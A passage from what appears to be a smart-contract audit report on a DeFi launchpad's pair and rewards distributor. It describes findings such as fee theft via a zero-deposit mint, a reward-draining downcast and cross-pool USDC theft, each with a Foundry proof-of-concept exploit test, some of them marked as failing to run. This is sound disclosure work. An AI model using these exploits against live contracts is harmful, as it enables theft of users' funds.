Loss of user yield/rewards when buying (increasing stake) or selling (decreasing stake) tokens. When a user transacts via the Launchpad, `Distributor.increaseStake` or `Distributor.decreaseStake` is triggered. These functions calculate pending rewards, but `_distributeAssets` transfers them to `msg.sender` (the Launchpad contract) instead of the `account`. Consequently, users permanently lose their accrued rewards during standard trading operations.

## Command to Run Test


## Proof of Concept
1. User has staked tokens and accrued rewards.
2. User buys more tokens via Launchpad.
3. Launchpad calls `distributor.increaseStake(token, user, amount)`.
4. `rs.stake` calculates user's pending rewards.
5. `_distributeAssets` transfers these rewards to `msg.sender` (the Launchpad).
6. User receives 0 rewards; funds are stuck in Launchpad.

## Proof of Code
function testRewardsDiverted() public {
    // 1. Setup initial stake for user via Launchpad
    address user = address(0xBEEF);
    uint96 stakeAmount = 100e18;
    
    vm.prank(launchpad);
    distributor.increaseStake(address(launchToken), user, stakeAmount);

    // 2. Add rewards to the pool to generate yield
    uint128 rewardAmount = 1000e18;
    address rewardToken = address(launchToken); 
    
    deal(rewardToken, address(this), rewardAmount);
    IERC20(rewardToken).approve(address(distributor), rewardAmount);
    distributor.addRewards(address(launchToken), address(0), rewardAmount, 0);

    // 3. Verify pending rewards exist
    (uint256 pendingBase,) = distributor.getPendingRewards(address(launchToken), user);
    assertGt(pendingBase, 0, "Should have pending rewards");

    // 4. User increases stake via Launchpad (buying more)
    uint256 userBalBefore = IERC20(rewardToken).balanceOf(user);
    uint256 launchpadBalBefore = IERC20(rewardToken).balanceOf(launchpad);

    vm.prank(launchpad);
    distributor.increaseStake(address(launchToken), user, stakeAmount);

    // 5. Assert rewards went to Launchpad, not User
    uint256 userBalAfter = IERC20(rewardToken).balanceOf(user);
    uint256 launchpadBalAfter = IERC20(rewardToken).balanceOf(launchpad);

    assertEq(userBalAfter, userBalBefore, "User received rewards incorrectly");
    assertGt(launchpadBalAfter, launchpadBalBefore, "Launchpad mistakenly received rewards");
}

## Suggested Mitigation
Modify `_distributeAssets` to accept a `recipient` argument. Update `increaseStake` and `decreaseStake` to pass the `account` parameter as the recipient. Update `claimRewards` to pass `msg.sender` as the recipient.


## [M-8]. Permanent DoS of `burn` function when fees are accrued

### Finding Severity Justification: The finding demonstrates a Denial of Service in the critical `burn` function. When `accruedLaunchpadFee` is non-zero (which occurs when multiple swaps happen in the same block), a user attempting to burn a significant portion (e.g., 100%) of their liquidity will cause the transaction to revert. This is because `burn` calculates the user's share based on the total balance (including the accrued fees), transfers it out, and then calls `_update` which attempts to subtract the fixed accrued fee amount from the now-empty balance, causing an underflow. This effectively blocks standard withdrawals until a specific workaround (`sync()`) is executed.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.burn

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `burn` function calculates the amounts to return to the user based on `balance` (which includes accrued fees). It then transfers these amounts out. Finally, it calls `_update`. `_update` attempts to calculate `reserve = balance - accruedFees`. If the user burned a significant portion of liquidity, the remaining `balance` in the contract may be less than the fixed `accruedFees` (since the user took a pro-rata share of the fees). This causes a subtraction underflow in `_update`, causing the transaction to revert.

## Impact
Medium. Users are unable to remove their full liquidity (DoS) if the pair has accrued fees that haven't been distributed. While the report mentions 'same block', the issue persists into future blocks because `burn` consumes the fee-tokens before `_update` can distribute them, causing an underflow. This effectively blocks `burn` for any user attempting to exit 100% of their position until a separate `sync()` or `swap` transaction clears the fees.

## Command to Run Test


## Proof of Concept
1. User A has liquidity.
2. A swap occurs, accruing fees into `accruedLaunchpadFee` (without distribution, e.g., `timeElapsed=0`).
3. User A calls `burn` to remove all liquidity.
4. `burn` sends `(balance * liquidity / totalSupply)` to User A.
5. Remaining `balance` is near zero.
6. `_update` attempts `reserve = balance - accruedLaunchpadFee`.
7. Underflow reverts the transaction.

## Proof of Code
contract TestBurnDoS is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 t0;
    MockERC20 t1;

    function setUp() public {
        t0 = new MockERC20();
        t1 = new MockERC20();
        if(address(t0) > address(t1)) (t0, t1) = (t1, t0);
        
        pair = new GTELaunchpadV2Pair();
        // Initialize with dummy addresses for lp and distributor
        pair.initialize(address(t0), address(t1), address(0x1), address(0x2)); 

        // Mint initial liquidity
        t0.mint(address(pair), 1000e18);
        t1.mint(address(pair), 1000e18);
        pair.mint(address(this));
    }

    function test_BurnDoS_WithAccruedFees() public {
        // 1. Simulate a swap to accrue fees
        t0.mint(address(pair), 10e18); // Input amount
        // Swap small amount out to trigger fee logic
        pair.swap(0, 1e18, address(this), "");

        // Verify fees accrued
        (uint112 f0, ,) = pair.getAccruedLaunchpadFees();
        assertGt(f0, 0, "Fees should have accrued");

        // 2. Attempt to burn 100% liquidity
        uint256 lpBalance = pair.balanceOf(address(this));
        pair.transfer(address(pair), lpBalance);

        // Expect revert due to underflow in _update
        vm.expectRevert();
        pair.burn(address(this));
    }
}

## Suggested Mitigation
Modify the `burn` function to subtract the `accruedLaunchpadFee` from the balance before calculating the user's pro-rata share. This ensures the fee tokens remain in the contract to be handled by `_update`.

```solidity
    function burn(address to) external lock returns (uint256 amount0, uint256 amount1) {
        (uint112 _reserve0, uint112 _reserve1,) = getReserves();
        address _token0 = token0;
        address _token1 = token1;
        uint256 balance0 = IERC20(_token0).balanceOf(address(this));
        uint256 balance1 = IERC20(_token1).balanceOf(address(this));
        uint256 liquidity = balanceOf[address(this)];

        bool feeOn = _mintFee(_reserve0, _reserve1);
        uint256 _totalSupply = totalSupply;

        // FIX: Subtract accrued fees from balance before calculating share
        // Use SafeMath or solidity 0.8 checked math implicitly
        uint256 availableBalance0 = balance0 > accruedLaunchpadFee0 ? balance0 - accruedLaunchpadFee0 : 0;
        uint256 availableBalance1 = balance1 > accruedLaunchpadFee1 ? balance1 - accruedLaunchpadFee1 : 0;

        amount0 = liquidity.mul(availableBalance0) / _totalSupply;
        amount1 = liquidity.mul(availableBalance1) / _totalSupply;
        
        if (amount0 == 0 || amount1 == 0) revert("UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED");
        _burn(address(this), liquidity);
        _safeTransfer(_token0, to, amount0);
        _safeTransfer(_token1, to, amount1);
        
        balance0 = IERC20(_token0).balanceOf(address(this));
        balance1 = IERC20(_token1).balanceOf(address(this));

        _update(balance0, balance1, _reserve0, _reserve1, uint112(0), uint112(0));
        if (feeOn) kLast = uint256(reserve0).mul(reserve1);
        emit Burn(msg.sender, amount0, amount1, to);
    }
```


## [H-9]. Theft of Accrued Launchpad Fees via mint() due to Reserve/Balance Mismatch

### Finding Severity Justification: The vulnerability allows an attacker to steal accrued protocol fees (Launchpad fees) by calling mint() with no deposit. Because the fees are subtracted from reserves but remain in the contract balance until distributed, the mint function interprets this surplus balance as a user donation, minting LP tokens to the attacker for free. This results in the dilution of existing LPs and theft of value intended for the Distributor. Since swaps occurring multiple times in a block (or simply the accumulation of fees) create this balance-reserve mismatch, the attack is easily reproducible and impactful.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.mint

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `GTELaunchpadV2Pair` contract tracks accrued launchpad fees by subtracting them from the reserves in `_update` (`reserve0 = balance0 - totalLaunchpadFee0`), while the tokens remain in the contract's `balanceOf(address(this))` until distributed. 

The `mint` function calculates the liquidity to mint based on the difference between the current balance and the reserves:
```solidity
uint256 amount0 = balance0.sub(_reserve0);
```
Because `_reserve0` has been reduced by the accrued fees but `balance0` still includes them (if they haven't been distributed/pulled yet), `amount0` interprets the accrued fees as new tokens deposited by the `mint` caller. This allows an attacker to steal all pending launchpad fees by calling `mint` with zero actual deposit.

## Impact
The vulnerability allows an attacker to mint LP tokens without providing assets by exploiting the inclusion of accrued launchpad fees in the contract's balance. By calling `mint` when fees have accrued, the attacker is credited with a deposit equal to the fee amount. Upon burning these free LP tokens, the attacker extracts a share of the pool's reserves and fees, causing direct financial loss to Liquidity Providers and preventing the full distribution of protocol fees.

## Command to Run Test


## Proof of Concept
1. The pair is initialized with liquidity (e.g., 1000 tokens).
2. A swap is executed, generating accrued launchpad fees (e.g., 100 tokens). The contract's `reserve` is updated to `balance - fees`, but the physical `balance` still holds the fees.
3. Attacker calls `mint(attacker)` with zero deposit.
4. `mint` calculates `amount = balance - reserve`. Since `balance` includes fees and `reserve` does not, `amount` equals the accrued fees (100).
5. Attacker receives LP tokens as if they had deposited 100 tokens.
6. Attacker calls `burn`, redeeming the LP tokens for a share of the total pool (reserves + fees), successfully stealing funds.

## Proof of Code
function testExploit_StealFees() public {
    // 1. Setup: Add initial liquidity
    uint256 initialLiq = 1000 ether;
    token0.transfer(address(pair), initialLiq);
    token1.transfer(address(pair), initialLiq);
    pair.mint(address(this));

    // 2. Generate Launchpad Fees via Swap
    uint256 swapAmount = 100 ether;
    token0.transfer(address(pair), swapAmount);
    pair.swap(0, 10 ether, address(this), ""); // Swap generates fees

    (uint112 fees0, ,) = pair.getAccruedLaunchpadFees();
    assertGt(fees0, 0, "Fees must accrue for exploit");

    // 3. Exploit: Attacker calls mint with NO deposit
    address attacker = address(0x1337);
    vm.startPrank(attacker);
    
    // Call mint. Logic uses (balance - reserve). 
    // Reserve excludes fees, Balance includes fees => Amount = Fees.
    pair.mint(attacker);
    
    uint256 attackerLp = pair.balanceOf(attacker);
    assertGt(attackerLp, 0, "Attacker minted LP tokens without deposit");

    // 4. Cash out (Burn) to realize theft
    pair.transfer(address(pair), attackerLp);
    pair.burn(attacker);
    vm.stopPrank();

    // 5. Verification of Theft
    assertGt(token0.balanceOf(attacker), 0, "Attacker stole Token0");
    // Token1 might also be stolen if fees accrued there or via pool ratio
}

## Suggested Mitigation
Update `mint` to explicitly subtract accrued fees from the balance when calculating amounts:

```solidity
// Inside mint function
uint256 amount0 = balance0.sub(uint256(_reserve0)).sub(uint256(accruedLaunchpadFee0));
uint256 amount1 = balance1.sub(uint256(_reserve1)).sub(uint256(accruedLaunchpadFee1));
```


## [H-10]. Launchpad Graduation Permanently Disables Fee Accrual

### Finding Severity Justification: The finding identifies a critical logic error in the protocol's lifecycle management. The `GTELaunchpadV2Pair` contract contains specific logic to accrue trading fees (`_getLaunchpadFees`) and send them to the `Distributor`. However, the `endRewardsAccrual` function, which sets `rewardsPoolActive` to 0, is called during the graduation process (when the pair is deployed and seeded). This action permanently disables the fee accrual mechanism before any public trading can occur on the AMM. This renders the entire fee distribution logic of the custom Pair contract dead code and results in a permanent loss of protocol revenue and user rewards from AMM trading, which is a core economic feature of the Launchpad.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.endRewardsAccrual

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `Distributor.endRewards` function is designed to be called upon 'Graduation' (when the bonding curve completes and the LP is seeded). It calls `pair.endRewardsAccrual()`. 

Inside `GTELaunchpadV2Pair.endRewardsAccrual()`, the variable `rewardsPoolActive` is deleted (set to 0). 

In `GTELaunchpadV2Pair._update()`, fees are only calculated and distributed if `rewardsPoolActive > 0`. 

This means exactly when the token graduates to the AMM and trading begins, the fee generation mechanism is permanently turned off. The Distributor will never receive trading fees from the LP, violating the core economic design of the protocol.

## Impact
Permanent loss of all protocol revenue/rewards from AMM trading pairs. Stakers receive zero yield from trading fees.

## Command to Run Test


## Proof of Concept
1. Deploy `LaunchToken` and graduate it, creating `GTELaunchpadV2Pair`.
2. `Launchpad` calls `Distributor.endRewards` -> `pair.endRewardsAccrual()`.
3. `pair.rewardsPoolActive` becomes 0.
4. Users swap on the pair.
5. `_update` checks `rewardsPoolActive > 0` -> False.
6. `launchpadFee` is calculated as 0.
7. No fees are sent to Distributor.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {MockERC20} from "solady/test/utils/mocks/MockERC20.sol";

contract MockDistributor {
    function addRewards(address, address, uint128, uint128) external {}
}

contract GTELaunchpadFeeTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    MockDistributor distributorContract;
    address distributor;
    address launchpadLp = address(0x99);

    function setUp() public {
        token0 = new MockERC20("T0", "T0", 18);
        token1 = new MockERC20("T1", "T1", 18);
        distributorContract = new MockDistributor();
        distributor = address(distributorContract);

        pair = new GTELaunchpadV2Pair();
        // pair.initialize(address(token0), address(token1), launchpadLp, distributor);
        // Note: In the provided code, initialize is external. In standard V2 it's called by factory.
        // We call it directly here for the test.
        pair.initialize(address(token0), address(token1), launchpadLp, distributor);
    }

    function testFeesDisabledAfterGraduation() public {
        // 1. Add Initial Liquidity
        // The fee calculation relies on launchpadLp holding LP tokens.
        token0.mint(address(pair), 1000e18);
        token1.mint(address(pair), 1000e18);
        pair.mint(launchpadLp);

        // 2. Simulate Graduation call (disable rewards)
        vm.prank(distributor);
        pair.endRewardsAccrual();

        // Verify active flag is cleared
        assertEq(pair.rewardsPoolActive(), 0);

        // 3. Perform Swap
        // Transfer input first (Uniswap V2 requirement)
        uint256 amountIn = 10e18;
        token0.mint(address(pair), amountIn);

        // Calculate safe output amount
        (uint112 r0, uint112 r1, ) = pair.getReserves();
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * uint256(r1);
        uint256 denominator = (uint256(r0) * 1000) + amountInWithFee;
        uint256 amountOut = numerator / denominator;

        // Swap
        pair.swap(0, amountOut, address(this), "");

        // 4. Check Fee Accrual
        (uint112 fee0, uint112 fee1, ) = pair.getAccruedLaunchpadFees();
        
        // With rewardsPoolActive deleted, fees should be 0
        assertEq(fee0, 0, "Fee0 should be 0 due to bug");
        assertEq(fee1, 0, "Fee1 should be 0 due to bug");
    }
}

## Suggested Mitigation
Modify `GTELaunchpadV2Pair.endRewardsAccrual` to remove the line `delete rewardsPoolActive;`. This ensures that while the graduation triggers the end of the initial bonding phase, the LP pair continues to accrue trading fees for the Distributor as intended by the protocol documentation.





 **Derived From** : StandardViolation

## [L-11]. DoS on USDT Pairs due to Unsafe Approval Reset in `_distributeLaunchpadFees`

### Finding Severity Justification: The finding correctly identifies that `_safeApprove` lacks the `approve(0)` reset required for USDT. However, the exploit relies on the trusted `launchpadFeeDistributor` contract failing to consume the full allowance. Since the Distributor is a trusted component defined by the protocol (Gate 5), and there is no evidence in the current codebase that it leaves residual allowance, the vulnerability assumes a future bug or misconfiguration (Gate 7 - Speculative). Per the Severity Matrix, High Impact (DoS of Pair) combined with Rare Likelihood (requires failure of trusted component) results in Low Severity.
## Derived From Pattern/Invariant
StandardViolation

## Exploit Type
StandardViolation

## Location
GTELaunchpadV2Pair._safeApprove

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `_safeApprove` function calls the underlying token's `approve` function with a non-zero value without first resetting the allowance to 0. 
```solidity
if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
```
Tokens like USDT revert if `approve` is called with a non-zero value when the current allowance is already non-zero. If the trusted `Distributor` fails to consume the exact allowance (e.g., due to partial consumption logic, pausing, or rounding), a residual allowance remains. The next time `_update` runs and tries to approve new fees, the transaction will revert, permanently bricking the pair for all swaps, mints, and burns.

## Impact
Denial of Service (DoS) for pairs involving USDT or similar tokens. Trading, minting, and burning become impossible if the Distributor ever leaves dust allowance.

## Command to Run Test


## Proof of Concept
1. Pair uses USDT as `token0`.
2. Fees accrue (`fee0 = 100`). `_safeApprove(USDT, distributor, 100)` is called. Allowance becomes 100.
3. `distributor.addRewards` is called but (hypothetically) consumes only 99 wei or fails to transfer due to logic, leaving allowance at 100 or 1.
4. Next swap occurs. Fees accrue (`fee0 = 50`).
5. `_safeApprove(USDT, distributor, 50)` is called.
6. USDT contract reverts because allowance is non-zero.
7. Transaction fails. Pair is broken.

## Proof of Code
contract MockUSDT is UniswapV2ERC20 {
    function approve(address spender, uint256 value) external override returns (bool) {
        // Revert if allowance > 0 and trying to set non-zero value (USDT behavior)
        if (allowance[msg.sender][spender] > 0 && value > 0) revert("USDT_Revert");
        return super.approve(spender, value);
    }
}

function testUSDTDoS_Updated() public {
    // 1. Setup
    MockUSDT usdt = new MockUSDT();
    MockERC20 token1 = new MockERC20();
    address pairAddr = factory.createPair(address(usdt), address(token1));
    GTELaunchpadV2Pair pair = GTELaunchpadV2Pair(pairAddr);
    address distributor = pair.launchpadFeeDistributor();

    // 2. Simulate residual allowance on the Pair (from a hypothetical previous failed distribution)
    // We prank the pair to set the stuck allowance
    vm.prank(address(pair));
    IERC20(address(usdt)).approve(distributor, 1);

    // 3. Add liquidity and perform swap to generate new fees
    usdt.mint(address(pair), 1000 ether);
    token1.mint(address(pair), 1000 ether);
    pair.mint(address(this));

    token1.mint(address(pair), 1 ether);
    
    // 4. Verify DoS
    // Pair calls _safeApprove -> MockUSDT reverts -> Pair reverts with APPROVAL_FAILED
    vm.expectRevert("UniswapV2: APPROVAL_FAILED");
    pair.swap(0, 0.5 ether, address(this), "");
}

## Suggested Mitigation
Modify `_safeApprove` to approve 0 before approving the new amount, or use `forceApprove` from OpenZeppelin/Solady.





 **Derived From** : UnsafeAssembyTypeCasts

## [H-12]. Unsafe Downcast in Reward Debt Calculation allows draining Rewards Distributor

### Finding Severity Justification: The vulnerability allows a user to drain the Rewards Distributor of the base asset (LaunchToken) if the user's accumulated rewards exceed type(uint96).max (~7.9e28 wei or ~79 billion tokens with 18 decimals). Given that the protocol is a permissionless Launchpad designed for meme coins and long-tail assets (which frequently have supplies in the trillions or quadrillions), this overflow condition is realistically achievable. The unsafe downcast truncates the user's reward debt, allowing them to repeatedly claim rewards they have already received, leading to a complete drain of the reward pool for that asset.
## Derived From Pattern/Invariant
UnsafeAssembyTypeCasts

## Exploit Type
RoundingError

## Location
RewardsTrackerLib.stake

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `RewardsTrackerLib.stake`, `unstake`, and `claim`, the contract explicitly casts the result of `totalAccRewards` to `uint96` when updating `userData.baseRewardDebt` and `userData.quoteRewardDebt`. The `accBaseRewardPerShare` is a monotonically increasing value scaled by `1e12`. For a standard 18-decimal token, if the cumulative rewards distributed per share reach just ~0.08 tokens (approx `7.9e16` wei unscaled), the calculation `shares * accRewardsPerShare / 1e12` will exceed `type(uint96).max` (`~7.9e28`). 

When this overflow happens, the `uint96(...)` cast silently truncates the high bits. The stored debt becomes significantly smaller than the actual rewards accounted for. In subsequent `claim` or `unstake` operations, the pending reward is calculated as `totalAccRewards - debt`. Since `totalAccRewards` uses the full `uint256` value and `debt` is the truncated value, the result is a massive positive number. This allows the user to drain the entire reward balance of the Distributor.

## Impact
For high-supply tokens (e.g., meme coins with supply > 79 billion), this vulnerability allows an attacker to drain the entire reward pool due to the massively inflated pending reward calculation. For tokens with smaller supplies, the calculated pending reward will exceed the protocol's tracked balance, causing all `claim` and `unstake` operations to revert. This results in a permanent Denial of Service, effectively locking the user's staked funds and rewards.

## Command to Run Test


## Proof of Concept
1. Attacker calls `increaseStake` with 1 wei of `LaunchToken` (via Launchpad).
2. Attacker calls `addRewards` with 1e18 tokens. Since `totalShares` is 1, `accBaseRewardPerShare` increases by `1e18 * 1e12 / 1 = 1e30`.
3. Attacker calls `increaseStake` again with 100e18 (100 tokens). 
4. The contract calculates the new debt: `totalAccRewards` = `(100e18 + 1) * 1e30 / 1e12` ≈ `1e38`.
5. `1e38` exceeds `type(uint96).max` (~7.9e28). The cast to `uint96` truncates the upper bits, storing a tiny debt value.
6. Attacker calls `claimRewards`. Pending rewards are calculated as `1e38 (current acc) - truncated_debt`.
7. This results in a pending reward of ~1e38. If the contract has enough token balance (meme coin), it is drained. If not, the transaction reverts (DoS).

## Proof of Code
function testUnsafeDowncastExploit() public {
    // 1. Setup: Stake 1 wei to prepare for skewing accPerShare
    vm.prank(launchpad);
    distributor.increaseStake(address(token), user, 1);

    // 2. Add rewards (1 token) to spike the accumulator
    // accPerShare += 1e18 * 1e12 / 1 = 1e30
    deal(address(token), address(this), 1e18);
    token.approve(address(distributor), 1e18);
    distributor.addRewards(address(token), address(0xdead), 1e18, 0);

    // 3. Stake a realistic amount (100 tokens)
    // totalAcc = 100e18 * 1e30 / 1e12 = 1e38
    // uint96 max is ~7.9e28. 1e38 overflows significantly.
    vm.prank(launchpad);
    distributor.increaseStake(address(token), user, 100e18);

    // 4. Verify the massive pending reward (Check View Function)
    (uint256 pendingBase, ) = distributor.getPendingRewards(address(token), user);
    
    // Pending should be ~1e38, proving the overflow occurred
    assertGt(pendingBase, 7.9e28);
    console.log("Massive Pending Rewards:", pendingBase);

    // 5. Attempt Claim (Will likely revert due to lack of 1e38 tokens in contract, demonstrating DoS/Drain risk)
    // Fund contract with some tokens to simulate a real pool
    deal(address(token), address(distributor), 1000e18);
    
    vm.startPrank(user);
    vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
    distributor.claimRewards(address(token));
    vm.stopPrank();
}

## Suggested Mitigation
Remove the `uint96` casting. Use `uint256` for `baseRewardDebt` and `quoteRewardDebt` in the `UserRewardData` struct, or implement SafeCast with reversion on overflow.





 **Derived From** : GriefableCallbacks

## [M-13]. DoS via Griefable Distributor Callback

### Finding Severity Justification: GATE 3 PASS (Impact: Medium). The finding demonstrates a Denial of Service (DoS) vector where a revert in the `Distributor` contract (e.g., due to being paused by an admin, running out of gas, or a logic error) causes the `_update` function in `GTELaunchpadV2Pair` to revert. Since `_update` is called by `swap`, `mint`, and `burn`, this creates a single point of failure where the unavailability of the reward system bricks the entire liquidity pool, freezing user funds and halting trading. This qualifies as a temporary but critical breakage of core functionality.
## Derived From Pattern/Invariant
GriefableCallbacks

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair._update

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `_update` function calls `_distributeLaunchpadFees`, which makes an external call to `IDistributor(distributor).addRewards`. This call is not wrapped in a try/catch block. If the Distributor contract reverts (e.g., is paused by admin, runs out of gas, or has a bug), the `_update` function reverts. Since `_update` is critical for `swap`, `mint`, and `burn`, the entire AMM pair becomes frozen.

## Impact
Medium. Complete denial of service for the liquidity pool.

## Command to Run Test


## Proof of Concept
1. Admin pauses `Distributor` (common functionality).
2. User tries to Swap.
3. `swap` -> `_update` -> `_distributeLaunchpadFees` -> `distributor.addRewards`.
4. `addRewards` reverts (paused).
5. Swap reverts. Pool is unusable.

## Proof of Code
contract DoSViaDistributorTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    MockDistributor distributor;

    function setUp() public {
        token0 = new MockERC20();
        token1 = new MockERC20();
        distributor = new MockDistributor();
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), address(0x1), address(distributor));
        token0.mint(address(pair), 1000 ether);
        token1.mint(address(pair), 1000 ether);
        pair.mint(address(this));
    }

    function testDistributorRevertBricksSwap() public {
        // 1. Simulate Distributor pause/bug
        distributor.setRevert(true);

        // 2. Initiate a swap that generates fees (amountIn > 0)
        token0.mint(address(pair), 1 ether);
        
        // 3. Expect Revert because _update calls _distributeLaunchpadFees which calls addRewards without try/catch
        vm.expectRevert("Distributor Paused");
        pair.swap(0, 100, address(this), "");
    }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 val) external { balanceOf[to] += val; }
    function transfer(address to, uint256 val) external returns (bool) { balanceOf[msg.sender] -= val; balanceOf[to] += val; return true; }
}

contract MockDistributor {
    bool shouldRevert;
    function setRevert(bool _s) external { shouldRevert = _s; }
    function addRewards(address, address, uint128, uint128) external view {
        if (shouldRevert) revert("Distributor Paused");
    }
}

## Suggested Mitigation
function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal returns (bool) {
    if ((fee0 | fee1) > 0) {
        // ... approve logic ...
        try IDistributor(launchpadFeeDistributor).addRewards(token0, token1, uint128(fee0), uint128(fee1)) {
            emit LaunchpadFeesCollected(fee0, fee1);
            return true;
        } catch {
            return false;
        }
    }
    return true;
}

// In _update function:
if (launchpadFeeDistributor > address(0)) {
    bool success = false;
    if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
        success = _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
    }

    if (success) {
        delete accruedLaunchpadFee0;
        delete accruedLaunchpadFee1;
    } else {
        // If failed, keep fees accrued so they aren't lost and allow swap to proceed
        accruedLaunchpadFee0 = totalLaunchpadFee0;
        accruedLaunchpadFee1 = totalLaunchpadFee1;
        if (newLaunchpadFee0 | newLaunchpadFee1 > 0) {
             emit LaunchpadFeesAccrued(newLaunchpadFee0, newLaunchpadFee1);
        }
    }
}





 **Derived From** : AccessControlOrAuthByPass

## [H-14]. addRewards allows depositing mismatched quote tokens to inflate reward pool

### Finding Severity Justification: The vulnerability allows an attacker to inflate the reward entitlement of a pool by depositing worthless tokens while the system accounts for them as if they were the pool's legitimate quote asset (e.g., USDC). When users claim these inflated rewards, they are paid out in the actual quote asset. Since the Distributor contract holds commingled quote assets for multiple pools, and the global `totalPendingRewards` safety check aggregates the balance of all pools sharing that quote asset, this allows users of the attacked pool to steal USDC belonging to other pools (Cross-Pool Theft). This constitutes a direct loss of funds, classified as High severity.
## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AccessControl

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `Distributor.addRewards(token0, token1, ...)` function identifies the reward pool using `token0` or `token1`. However, it fails to verify that the *second* provided token matches the pool's configured `quoteAsset`. 

If a pool exists for `LaunchToken` (base) and `USDC` (quote), an attacker can call `addRewards(LaunchToken, JunkToken, 0, amount)`. The function correctly identifies the pool for `LaunchToken`, but then uses `JunkToken` as the `quoteAsset` input for `rs.addQuoteRewards`. 

This increments `rs.pendingQuoteRewards` (which represents USDC liabilities) by the `JunkToken` amount, and transfers `JunkToken` to the contract. The `totalPendingRewards` mapping is updated for `JunkToken`, but the pool's internal accounting now believes it has more USDC than it actually does. Users will claim USDC based on these inflated numbers, draining the legitimate USDC from the contract.

## Impact
Theft of legitimate quote assets (e.g., USDC) by diluting the pool with worthless tokens. Insolvency of the Distributor.

## Command to Run Test


## Proof of Concept
1. Setup: Deploy Distributor and create two pools: Pool A (TokenA/USDC) and Pool B (TokenB/USDC).
2. Legit Deposit: Users stake in Pool A; 10,000 USDC rewards are added. `totalPendingRewards[USDC]` = 10,000.
3. Attack Prep: Attacker stakes in Pool B.
4. Exploit: Attacker calls `addRewards(TokenB, JunkToken, 0, 5000)`. The Distributor accepts JunkToken but inflates Pool B's internal USDC entitlement (`pendingQuoteRewards`) by 5,000.
5. Theft: Attacker claims rewards from Pool B. The Distributor checks global USDC solvency (`totalPendingRewards[USDC]`). Since 10,000 > 5,000, the check passes. Attacker receives 5,000 real USDC.
6. Insolvency: Pool A users try to claim their 10,000 USDC but the contract only has 5,000 remaining.

## Proof of Code
contract DistributorExploitTest is Test {
    Distributor distributor;
    MockERC20 usdc;
    MockERC20 tokenA;
    MockERC20 tokenB;
    MockERC20 junk;
    
    address alice = address(0xA1);
    address bob = address(0xB2);
    address launchpad = address(this); 

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);
        usdc = new MockERC20("USDC", "USDC", 6);
        tokenA = new MockERC20("TokenA", "TKNA", 18);
        tokenB = new MockERC20("TokenB", "TKNB", 18);
        junk = new MockERC20("Junk", "JUNK", 18);
        
        // Create legitimate pools
        distributor.createRewardsPair(address(tokenA), address(usdc));
        distributor.createRewardsPair(address(tokenB), address(usdc));
    }

    function testCrossPoolTheft() public {
        // 1. Honest Setup (Pool A)
        // Alice stakes in Pool A
        tokenA.mint(launchpad, 1000 ether); 
        distributor.increaseStake(address(tokenA), alice, 1000 ether);
        
        // Add 10,000 real USDC rewards to Pool A
        usdc.mint(address(this), 10000e6);
        usdc.approve(address(distributor), 10000e6);
        distributor.addRewards(address(tokenA), address(usdc), 0, 10000e6);

        // 2. Attack Setup (Pool B)
        // Bob stakes in Pool B
        tokenB.mint(launchpad, 1000 ether);
        distributor.increaseStake(address(tokenB), bob, 1000 ether);
        
        // 3. Exploit: Bob adds rewards using 'Junk' as the quote asset
        junk.mint(address(this), 5000e6);
        junk.approve(address(distributor), 5000e6);
        // This call inflates Pool B's pending quote rewards by 5000, backed by Junk
        distributor.addRewards(address(tokenB), address(junk), 0, 5000e6);
        
        // Verify Pool B thinks it has 5000 USDC pending
        (,,, uint128 pendingQuoteB,,) = distributor.getRewardsPoolData(address(tokenB));
        assertEq(pendingQuoteB, 5000e6);

        // 4. Bob claims 'USDC' from Pool B
        vm.prank(bob);
        distributor.claimRewards(address(tokenB));
        
        // 5. Verify Theft: Bob received real USDC (stolen from Pool A's backing)
        assertEq(usdc.balanceOf(bob), 5000e6);
        
        // 6. Verify Insolvency: Alice tries to claim her entitlements and fails
        vm.prank(alice);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.claimRewards(address(tokenA));
    }
}

## Suggested Mitigation
error InvalidQuoteAsset();

